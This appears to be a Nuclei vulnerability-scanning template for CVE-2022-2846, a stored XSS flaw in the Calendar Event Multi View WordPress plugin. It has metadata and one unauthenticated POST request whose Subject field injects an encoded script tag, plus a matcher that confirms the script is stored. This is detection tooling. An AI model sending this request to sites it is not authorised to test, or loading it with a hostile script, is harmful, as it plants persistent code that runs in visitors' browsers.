id: CVE-2022-2846

info:
  name: Unauthenticated Arbitrary Event Creation to Stored XSS in Calendar Event Multi View Plugin
  author: ProjectDiscoveryAI
  severity: medium
  description: The Calendar Event Multi View WordPress plugin before 1.4.07 allows unauthenticated attackers to create arbitrary events with XSS payloads due to lack of authorisation, CSRF checks, and improper sanitisation.
  impact: |
    Successful exploitation could result in unauthorized event creation and execution of malicious scripts in the context of the victim's browser.
  remediation: |
    Update to the latest version of the Calendar Event Multi View Plugin to mitigate the Unauthenticated Arbitrary Event Creation to Stored XSS vulnerability (CVE-2022-2846).
  reference:
    - https://wpscan.com/vulnerability/95f92062-08ce-478a-a2bc-6d026adf657c
    - http://packetstormsecurity.com/files/171697/Calendar-Event-Multi-View-1.4.07-Cross-Site-Scripting.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N
    cvss-score: 4.3
    cve-id: CVE-2022-2846
    cwe-id: CWE-79,CWE-352
    epss-score: 0.00231
    epss-percentile: 0.61967
    cpe: cpe:2.3:a:dwbooster:calendar_event_multi_view:*:*:*:*:*:wordpress:*:*
  metadata:
    vendor: dwbooster
    product: calendar_event_multi_view
    framework: wordpress
  tags: wpscan,packetstorm

http:
  - method: POST
    path:
      - "{{BaseURL}}/?cpmvc_do_action=mvparse&f=datafeed&calid=1&month_index=0&method=adddetails"

    body: |
      Subject=%22%3E%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E&colorvalue=%23f00&rrule=&rruleType=&stpartdate=10%2F6%2F2022&stparttime=00%3A00&etpartdate=10%2F6%2F2022&etparttime=00%3A00&stpartdatelast=10%2F6%2F2022&etpartdatelast=10%2F6%2F2022&stparttimelast=&etparttimelast=&IsAllDayEvent=1&Location=CSRF&Description=%3Cp+style%3D%22text-align%3A+left%3B%22%3ECSRF%3C%2Fp%3E&timezone=4.5

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "<script>alert(/XSS/)</script>"
        part: body
